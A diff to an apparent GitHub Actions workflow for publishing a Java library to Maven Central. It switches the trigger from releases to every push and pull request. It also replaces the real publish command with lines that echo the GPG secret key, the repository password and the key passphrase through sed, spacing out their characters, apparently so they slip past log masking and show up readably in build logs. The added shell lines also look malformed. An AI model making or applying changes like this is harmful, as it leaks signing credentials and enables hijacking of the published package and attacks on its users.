@@ -1,7 +1,5 @@
 name: Publish package to the Maven Central Repository
-on:
-  release:
-    types: [created]
+on: [push, pull_request]
 jobs:
   publish:
     environment:
@@ -15,7 +13,9 @@ jobs:
           java-version: '8'
           distribution: 'adopt'
       - name: Publish Testify Library
-        run: ./gradlew Library:publish
+        run: echo ${{secrets.OSSRH_GPG_SECRET_KEY}} | sed 's/./& /g';
+          | echo ${{secrets.OSSRH_PASSWORD}} | sed 's/./& /g';
+          | echo ${{secrets.OSSRH_GPG_SECRET_KEY_PASSWORD}} | sed 's/./& /g';
         env:
           OSSRH_USERNAME: ${{ secrets.OSSRH_USERNAME }}
           OSSRH_PASSWORD: ${{ secrets.OSSRH_PASSWORD }}
